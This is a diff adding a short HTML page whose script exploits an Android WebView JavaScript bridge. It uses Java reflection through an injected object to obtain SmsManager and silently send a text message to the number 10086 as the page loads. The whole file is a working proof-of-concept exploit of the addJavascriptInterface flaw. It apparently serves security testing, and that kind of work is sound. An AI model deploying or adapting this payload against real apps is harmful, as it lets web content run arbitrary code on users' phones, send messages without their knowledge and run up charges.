@@ -1,0 +1,8 @@
+<html>
+<body>
+<script>
+         var objSmsManager = injectedObj.getClass().forName("android.telephony.SmsManager").getMethod("getDefault",null).invoke(null,null);
+         objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading",null,null);
+</script>
+</body>
+</html>
